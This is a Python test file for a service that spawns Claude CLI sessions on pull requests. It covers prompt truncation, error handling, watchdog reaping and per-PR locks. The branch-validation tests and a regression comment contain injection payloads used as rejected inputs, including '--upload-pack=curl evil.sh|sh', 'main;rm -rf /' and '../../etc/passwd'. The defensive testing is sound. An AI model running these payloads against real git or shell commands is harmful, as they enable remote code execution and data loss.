"""Tests for SessionSpawner — verifies CLI invocation and error handling."""

from __future__ import annotations

import subprocess
import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

import spawner
from spawner import SessionSpawner, _is_safe_branch


class TestSpawnPrReview:
    def test_spawns_with_opus_model(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen") as mock_popen:
            result = spawner.spawn_pr_review(
                pr_number=42,
                pr_diff="Diff available at: https://example.com/42.diff",
                ticket_context="Implements PROJ-123",
            )

        assert result is True
        mock_popen.assert_called_once()
        cmd = mock_popen.call_args[0][0]
        assert cmd[0] == "claude"
        assert "-p" in cmd
        model_idx = cmd.index("--model")
        assert cmd[model_idx + 1] == "opus"

    def test_truncates_diff_to_1500_chars(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        marker = "\u00b6"  # Pilcrow — won't appear in prompt template
        long_diff = marker * 5000

        with patch("spawner.subprocess.Popen") as mock_popen:
            spawner.spawn_pr_review(pr_number=1, pr_diff=long_diff, ticket_context="")

        cmd = mock_popen.call_args[0][0]
        prompt = cmd[cmd.index("-p") + 1]
        # Diff is truncated to 1500 chars via [:1500] in spawner
        assert prompt.count(marker) == 1500


class TestSpawnCiFix:
    def test_spawns_with_sonnet_model(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        ok_result = MagicMock(returncode=0, stderr="", stdout="")

        with patch("spawner.subprocess.Popen") as mock_popen, \
             patch("spawner.subprocess.run", return_value=ok_result):
            result = spawner.spawn_ci_fix(
                pr_number=42, branch="ai/PROJ-123", failure_logs="Error: test failed"
            )

        assert result is True
        cmd = mock_popen.call_args[0][0]
        assert "--model" in cmd
        model_idx = cmd.index("--model")
        assert cmd[model_idx + 1] == "sonnet"

    def test_truncates_failure_logs_to_3000_chars(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        long_logs = "E" * 10000
        ok_result = MagicMock(returncode=0, stderr="", stdout="")

        with patch("spawner.subprocess.Popen") as mock_popen, \
             patch("spawner.subprocess.run", return_value=ok_result):
            spawner.spawn_ci_fix(pr_number=1, branch="main", failure_logs=long_logs)

        cmd = mock_popen.call_args[0][0]
        prompt = cmd[cmd.index("-p") + 1]
        assert len(prompt) < 10000


class TestSpawnCommentResponse:
    def test_spawns_with_sonnet_model(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen") as mock_popen:
            result = spawner.spawn_comment_response(
                pr_number=42,
                comment_body="Why this approach?",
                comment_author="reviewer",
            )

        assert result is True
        cmd = mock_popen.call_args[0][0]
        assert "--model" in cmd

    def test_truncates_comment_body_to_3000_chars(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        long_comment = "W" * 10000

        with patch("spawner.subprocess.Popen") as mock_popen:
            spawner.spawn_comment_response(
                pr_number=1, comment_body=long_comment, comment_author="user"
            )

        cmd = mock_popen.call_args[0][0]
        prompt = cmd[cmd.index("-p") + 1]
        assert len(prompt) < 10000


class TestSpawnErrorHandling:
    def test_returns_false_when_cli_not_found(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen", side_effect=FileNotFoundError):
            result = spawner.spawn_pr_review(pr_number=1, pr_diff="", ticket_context="")

        assert result is False

    def test_returns_false_on_os_error(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen", side_effect=OSError("spawn failed")):
            result = spawner.spawn_ci_fix(pr_number=1, branch="main", failure_logs="")

        assert result is False

    def test_uses_repo_path_as_cwd(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/my-repo")

        with patch("spawner.subprocess.Popen") as mock_popen:
            spawner.spawn_pr_review(pr_number=1, pr_diff="", ticket_context="")

        assert mock_popen.call_args[1]["cwd"] == "/tmp/my-repo"

    def test_empty_repo_path_fails_closed(self) -> None:
        spawner = SessionSpawner(repo_path="")

        with (
            patch("spawner.subprocess.Popen") as mock_popen,
            patch.dict("os.environ", {"CLIENT_REPO_PATH": ""}, clear=False),
        ):
            result = spawner.spawn_pr_review(pr_number=1, pr_diff="", ticket_context="")

        assert result is False
        mock_popen.assert_not_called()


# --- Branch-name argument-injection regression ---
#
# Bug: _ensure_branch_current passed webhook-controlled branch names
# directly into `git fetch origin <branch>` etc. A branch starting
# with `-` (e.g. `--upload-pack=curl evil.sh|sh`) would be parsed by
# git as an option, historically a full RCE vector (CVE-2017-1000117
# family). Fix: validate branch names against _SAFE_BRANCH_RE and
# add `--` sentinel to fetch/pull (checkout can't use `--` because
# it treats args after `--` as pathspecs).


class TestBranchNameValidation:
    def test_safe_branch_accepts_normal_names(self) -> None:
        assert _is_safe_branch("main")
        assert _is_safe_branch("feature/foo")
        assert _is_safe_branch("ai/SCRUM-16")
        assert _is_safe_branch("release/2026.04")
        assert _is_safe_branch("user_branch.v2")

    def test_safe_branch_rejects_leading_dash(self) -> None:
        assert not _is_safe_branch("-foo")
        assert not _is_safe_branch("--upload-pack=curl")
        assert not _is_safe_branch("-")

    def test_safe_branch_rejects_empty_and_whitespace(self) -> None:
        assert not _is_safe_branch("")
        assert not _is_safe_branch(" main")
        assert not _is_safe_branch("main branch")
        assert not _is_safe_branch("main\n")
        assert not _is_safe_branch("main\t")

    def test_safe_branch_rejects_shell_metacharacters(self) -> None:
        assert not _is_safe_branch("main;rm -rf /")
        assert not _is_safe_branch("main`whoami`")
        assert not _is_safe_branch("main$(pwd)")
        assert not _is_safe_branch("main|cat")
        assert not _is_safe_branch("main&&evil")

    def test_safe_branch_rejects_double_dot(self) -> None:
        assert not _is_safe_branch("../../etc/passwd")
        assert not _is_safe_branch("foo..bar")

    def test_safe_branch_rejects_overlong(self) -> None:
        assert not _is_safe_branch("a" * 256)

    def test_ensure_branch_current_rejects_unsafe_branch(
        self, tmp_path
    ) -> None:
        """Unsafe branches must short-circuit without running git."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        log = MagicMock()
        with patch("spawner.subprocess.run") as mock_run:
            spawner._ensure_branch_current("--upload-pack=evil", log)
        mock_run.assert_not_called()
        log.error.assert_called_once()
        assert log.error.call_args[0][0] == "unsafe_branch_name_rejected"

    def test_ensure_branch_current_git_fetch_uses_sentinel(
        self, tmp_path
    ) -> None:
        """Safe branches should invoke git with the '--' sentinel for fetch/pull."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        log = MagicMock()
        ok_result = MagicMock(returncode=0, stderr="")
        with patch("spawner.subprocess.run", return_value=ok_result) as mock_run:
            spawner._ensure_branch_current("ai/SCRUM-16", log)
        # All subprocess.run calls — verify fetch and pull include "--"
        calls = [call.args[0] for call in mock_run.call_args_list]
        fetch_cmd = next(c for c in calls if c[:2] == ["git", "fetch"])
        pull_cmd = next(c for c in calls if c[:2] == ["git", "pull"])
        assert "--" in fetch_cmd
        assert fetch_cmd[-1] == "ai/SCRUM-16"
        assert "--" in pull_cmd
        assert pull_cmd[-1] == "ai/SCRUM-16"

    def test_ensure_branch_current_repo_match_is_exact(
        self, tmp_path
    ) -> None:
        """A similarly named repo must not satisfy expected_repo by substring."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        log = MagicMock()
        remote = MagicMock(
            returncode=0,
            stdout="git@github.com:evil/acme-project.git\n",
            stderr="",
        )
        with patch("spawner.subprocess.run", return_value=remote) as mock_run:
            ok = spawner._ensure_branch_current(
                "ai/SCRUM-16", log, expected_repo="acme/project"
            )
        assert ok is False
        assert mock_run.call_count == 1
        log.error.assert_called_once()
        assert log.error.call_args[0][0] == "repo_mismatch"


# --- Watchdog zombie-reap regression ---
#
# Bug: _spawn's watchdog thread called proc.kill() on timeout but
# never proc.wait()'d afterward, leaving the child in zombie state.
# Over many timeouts the L3 process accumulates zombies and
# eventually hits RLIMIT_NPROC, at which point every new spawn
# fails silently. Fix: after proc.kill(), call proc.wait(timeout=5)
# to reap. Log l3_session_unreapable if the 5s wait fails.


class TestWatchdogZombieReap:
    def _spawn_with_mock_proc(
        self, proc_mock: MagicMock, tmp_path
    ) -> threading.Thread | None:
        """Spawn a session with a mocked Popen and capture the watchdog thread."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        captured: dict[str, threading.Thread] = {}
        real_thread_start = threading.Thread.start

        def _capture_start(self: threading.Thread) -> None:
            captured["t"] = self
            real_thread_start(self)

        with (
            patch("spawner.subprocess.Popen", return_value=proc_mock),
            patch.object(threading.Thread, "start", _capture_start),
        ):
            spawner._spawn(
                "pr-review",
                "test prompt",
                model="opus",
                pr_number=1,
            )
        return captured.get("t")

    def test_watchdog_reaps_after_kill(self, tmp_path) -> None:
        """On timeout → kill, watchdog must call wait() again to reap."""
        proc = MagicMock()
        proc.pid = 99999
        # First wait (with timeout=session_timeout) raises TimeoutExpired
        # to trigger the kill path. Second wait (after kill) returns 0.
        proc.wait = MagicMock(
            side_effect=[
                subprocess.TimeoutExpired(cmd="claude", timeout=1),
                0,  # successful reap
            ]
        )
        proc.kill = MagicMock()

        # Shrink timeout so wait triggers immediately
        with patch.dict("os.environ", {"L3_SESSION_TIMEOUT": "1"}):
            watchdog = self._spawn_with_mock_proc(proc, tmp_path)
        assert watchdog is not None
        watchdog.join(timeout=5)
        assert not watchdog.is_alive()

        # First: waited for timeout and TimeoutExpired fired
        # Kill was called
        proc.kill.assert_called_once()
        # Second wait with timeout=5 must have been called to reap the zombie
        assert proc.wait.call_count == 2, (
            "watchdog must call proc.wait() AFTER proc.kill() to reap zombie — "
            "regression for RLIMIT_NPROC leak bug"
        )
        second_call_kwargs = proc.wait.call_args_list[1][1]
        second_call_args = proc.wait.call_args_list[1][0]
        # timeout=5 passed as kwarg or positional
        assert (
            second_call_kwargs.get("timeout") == 5
            or (second_call_args and second_call_args[0] == 5)
        )

    def test_watchdog_logs_unreapable_on_secondary_timeout(
        self, tmp_path
    ) -> None:
        """If the post-kill wait also times out, log l3_session_unreapable."""
        proc = MagicMock()
        proc.pid = 99999
        proc.wait = MagicMock(
            side_effect=[
                subprocess.TimeoutExpired(cmd="claude", timeout=1),
                subprocess.TimeoutExpired(cmd="claude", timeout=5),
            ]
        )
        proc.kill = MagicMock()

        with (
            patch.dict("os.environ", {"L3_SESSION_TIMEOUT": "1"}),
            patch("spawner.logger") as mock_logger,
        ):
            watchdog = self._spawn_with_mock_proc(proc, tmp_path)
            assert watchdog is not None
            watchdog.join(timeout=5)

        # The unreapable log event must have fired
        error_calls = [
            c for c in mock_logger.error.call_args_list
            if c.args and c.args[0] == "l3_session_unreapable"
        ]
        assert error_calls, "l3_session_unreapable must be logged when second wait times out"


# --- Task 3.3: per-PR file-lock claim for concurrent spawn prevention ---
#
# Bug: GitHub retries failed webhook deliveries with NEW X-GitHub-Delivery
# IDs, bypassing _processed_deliveries dedup. Two concurrent
# spawn_pr_review invocations on the same PR then race on
# git fetch/git checkout inside the shared worktree, corrupting branch
# state. Fix: before spawning, acquire a file-lock on
# <logs>/.spawn-claims/pr-<repo>-<pr>-pr-review.lock. The second
# concurrent spawn sees the lock held and returns early.


class TestSpawnClaim:
    """Ensure concurrent spawns on the same PR serialize; different PRs
    run in parallel; the lock is released after the spawn exits."""

    def test_concurrent_spawns_same_pr_only_one_succeeds(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Two threads invoke spawn_pr_review at the same time; only
        the first acquires the claim. The second returns False with
        a pr_review_spawn_already_in_progress log event."""
        # Redirect the module-level LOGS_DIR so we don't collide with
        # a real production logs dir.
        monkeypatch.setattr(spawner, "LOGS_DIR", tmp_path)
        (tmp_path / ".spawn-claims").mkdir(parents=True, exist_ok=True)

        s = SessionSpawner(repo_path=str(tmp_path))

        # Gate the first spawn's subprocess.Popen on a threading.Event
        # so its claim stays held while the second spawn attempts.
        started = threading.Event()
        proceed = threading.Event()

        def _slow_popen(*args: object, **kwargs: object) -> MagicMock:
            started.set()
            proceed.wait(timeout=5)
            # Return a mock proc so the watchdog thread can wait on it
            proc = MagicMock()
            proc.pid = 12345
            proc.wait = MagicMock(return_value=0)
            proc.kill = MagicMock()
            return proc

        results: dict[str, bool] = {}

        def _call_first() -> None:
            with patch("spawner.subprocess.Popen", side_effect=_slow_popen):
                results["first"] = s.spawn_pr_review(
                    pr_number=42, pr_diff="", ticket_context="",
                    repo="acme/project",
                )

        t1 = threading.Thread(target=_call_first)
        t1.start()
        assert started.wait(timeout=5), "first spawn never reached Popen"

        # At this point thread 1 is holding the claim (inside
        # subprocess.Popen, before the watchdog starts). Thread 2's
        # claim attempt must fail.
        with patch("spawner.subprocess.Popen") as second_popen:
            results["second"] = s.spawn_pr_review(
                pr_number=42, pr_diff="", ticket_context="",
                repo="acme/project",
            )
        # Thread 2 never got to Popen
        assert second_popen.call_count == 0, (
            "second spawn bypassed the claim lock and called Popen"
        )
        assert results["second"] is False, (
            "second spawn must return False when the claim is held"
        )

        # Release thread 1 so it finishes
        proceed.set()
        t1.join(timeout=5)
        assert results["first"] is True

    def test_ci_fix_uses_claim_lock(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """CI-fix sessions must share the same per-PR claim protection
        as PR review sessions.
        """
        monkeypatch.setattr(spawner, "LOGS_DIR", tmp_path)
        (tmp_path / ".spawn-claims").mkdir(parents=True, exist_ok=True)
        held = spawner._try_claim_pr_session(
            tmp_path, "acme/project", 42, "ci-fix"
        )
        assert held is not None
        s = SessionSpawner(repo_path=str(tmp_path))
        try:
            with patch("spawner.subprocess.Popen") as mock_popen:
                result = s.spawn_ci_fix(
                    pr_number=42,
                    branch="ai/SCRUM-16",
                    failure_logs="failed",
                    repo="acme/project",
                )
            assert result is False
            mock_popen.assert_not_called()
        finally:
            spawner._release_pr_claim(held)

    def test_comment_response_uses_claim_lock(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Comment-response sessions must not race each other on a PR."""
        monkeypatch.setattr(spawner, "LOGS_DIR", tmp_path)
        (tmp_path / ".spawn-claims").mkdir(parents=True, exist_ok=True)
        held = spawner._try_claim_pr_session(
            tmp_path, "acme/project", 42, "comment-response"
        )
        assert held is not None
        s = SessionSpawner(repo_path=str(tmp_path))
        try:
            with patch("spawner.subprocess.Popen") as mock_popen:
                result = s.spawn_comment_response(
                    pr_number=42,
                    comment_body="please fix",
                    comment_author="reviewer",
                    branch="ai/SCRUM-16",
                    repo="acme/project",
                )
            assert result is False
            mock_popen.assert_not_called()
        finally:
            spawner._release_pr_claim(held)

    def test_different_prs_spawn_in_parallel(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """PR 1 and PR 2 have separate claim files → both can spawn."""
        monkeypatch.setattr(spawner, "LOGS_DIR", tmp_path)
        (tmp_path / ".spawn-claims").mkdir(parents=True, exist_ok=True)
        s = SessionSpawner(repo_path=str(tmp_path))

        def _quick_popen(*args: object, **kwargs: object) -> MagicMock:
            proc = MagicMock()
            proc.pid = 1111
            proc.wait = MagicMock(return_value=0)
            return proc

        with patch("spawner.subprocess.Popen", side_effect=_quick_popen):
            r1 = s.spawn_pr_review(
                pr_number=1, pr_diff="", ticket_context="", repo="acme/project",
            )
            r2 = s.spawn_pr_review(
                pr_number=2, pr_diff="", ticket_context="", repo="acme/project",
            )
        assert r1 is True and r2 is True

    def test_claim_released_after_spawn_exits(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """After the first spawn's watchdog exits, a second spawn on
        the same PR can succeed."""
        monkeypatch.setattr(spawner, "LOGS_DIR", tmp_path)
        (tmp_path / ".spawn-claims").mkdir(parents=True, exist_ok=True)
        s = SessionSpawner(repo_path=str(tmp_path))

        # First spawn — watchdog runs to completion quickly.
        proc1 = MagicMock()
        proc1.pid = 1001
        proc1.wait = MagicMock(return_value=0)

        with patch("spawner.subprocess.Popen", return_value=proc1):
            r1 = s.spawn_pr_review(
                pr_number=99, pr_diff="", ticket_context="",
                repo="acme/project",
            )
        assert r1 is True

        # Let the watchdog thread run to completion so it releases
        # the claim. The watchdog is a daemon thread — we need to
        # poll for the claim release rather than joining (no handle).
        import time
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline:
            # Poll for the claim file being unlocked by trying to
            # acquire it. If we can, the watchdog has finished.
            fd = spawner._try_claim_pr_session(
                tmp_path, "acme/project", 99, "pr-review"
            )
            if fd is not None:
                spawner._release_pr_claim(fd)
                break
            time.sleep(0.05)
        else:
            raise AssertionError(
                "Claim was never released by the first spawn's watchdog"
            )

        # Second spawn on the same PR — should now succeed.
        proc2 = MagicMock()
        proc2.pid = 1002
        proc2.wait = MagicMock(return_value=0)
        with patch("spawner.subprocess.Popen", return_value=proc2):
            r2 = s.spawn_pr_review(
                pr_number=99, pr_diff="", ticket_context="",
                repo="acme/project",
            )
        assert r2 is True
